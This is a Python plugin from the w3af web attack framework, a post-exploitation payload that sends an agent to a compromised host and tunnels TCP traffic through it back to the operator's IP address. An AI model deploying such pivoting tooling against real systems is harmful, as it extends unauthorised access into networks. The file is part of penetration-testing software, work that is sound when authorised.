from plugins.attack.payloads.base_payload import base_payload
import core.controllers.outputManager as om

from core.controllers.w3afException import w3afException
from core.controllers.misc.is_ip_address import is_ip_address
from core.controllers.w3afAgent.w3afAgentManager import w3afAgentManager


class w3af_agent(base_payload):
    '''
    This payload starts a w3af agent that allows you to route TCP traffic through the compromised host.
    '''
    def api_execute(self, parameters):
        '''
        Start a w3afAgent, to do this, I must transfer the agent client to the
        remote end and start the w3afServer in this local machine
        all this work is done by the w3afAgentManager, I just need to called
        start and thats it.
        '''
        usage = 'Usage: w3af_agent <your ip address>'
        if len(parameters) != 1:
            return usage
        
        ip_address = parameters[0]
        if not is_ip_address( ip_address ):
            return usage
        
        try:
            agentManager = w3afAgentManager(self.shell.execute, ip_address)
        except w3afException, w3:
            return 'Error' + str(w3)
        else:
            agentManager.run()
            if agentManager.isWorking(): 
                return 'Successfully started the w3afAgent.'
            else:
                return 'Failed to start the w3afAgent.'
    
    def run_execute(self, parameters):
        api_result = self.api_execute(parameters)
        return api_result
